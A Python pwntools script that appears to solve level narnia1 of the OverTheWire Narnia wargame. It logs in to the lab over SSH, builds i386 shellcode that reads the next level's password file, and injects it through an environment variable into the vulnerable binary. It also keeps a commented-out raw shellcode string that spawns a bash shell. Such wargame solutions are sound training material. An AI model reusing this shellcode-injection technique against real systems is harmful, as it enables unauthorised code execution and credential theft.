#!/usr/bin/env python2
from __future__ import print_function
import pwn
import getpass
import sys

# Configuration variables
user = 'narnia1'
executable = '/narnia/{}'.format(user)
host = 'narnia.labs.overthewire.org'
port = 2226
pwn.context.arch = 'i386'
pwn.context.os = 'linux'

# Get password for SSH login
try:
    password = getpass.getpass(prompt='Narnia2 password: ')
except Exception as e:
    print('[-] Error getting password: ' + e)
    sys.exit(-1)

# Login to SSH
s = pwn.tubes.ssh.ssh(host=host,
                      port=port,
                      user=user,
                      password=password)

# Prepare exploit
# Shellcode: system('/bin/bash')
# payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f"\
#         "\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

shellcode = pwn.shellcraft.i386.linux.cat('/etc/narnia_pass/narnia2')
payload = pwn.asm(shellcode)

# Send exploit and get password
p = s.process(executable=executable,
              env={'EGG': payload},
              raw=True)
print(p.recvall())
# p.sendline('cat /etc/narnia_pass/narnia2')
# narnia_password = p.recvline()
# print('Narnia2: {}'.format(narnia_password.split()[-1]))
# p.interactive()
p.close()
s.close()
